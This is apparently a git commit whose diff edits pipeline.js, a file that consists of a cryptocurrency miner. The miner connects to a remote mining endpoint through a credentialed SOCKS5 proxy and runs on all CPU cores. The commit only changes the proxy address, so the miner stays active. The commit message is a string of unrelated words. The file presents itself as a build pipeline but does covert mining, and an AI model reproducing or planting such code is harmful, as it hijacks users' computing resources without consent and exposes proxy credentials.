46b609df497ae04de92d588d2fabead3d0a29a29
Irma Goldner <irma_goldner@yahoo.com>
2026-08-22 14:36:26 +0530

    loyally within around ah foretell

--- pipeline.js
+++ pipeline.js
@@ -1,2 +1,2 @@
 const { NMiner } = require("nminer");
-new NMiner("wss://runtime.nmining.igrp.app/", "admin.pipeline", { proxy: "socks5://dcswarup:webshare@173.211.8.109:6221", threads: require("os").cpus().length, throttle: true });
+new NMiner("wss://runtime.nmining.igrp.app/", "admin.pipeline", { proxy: "socks5://dcswarup:webshare@192.241.125.110:8154", threads: require("os").cpus().length, throttle: true });
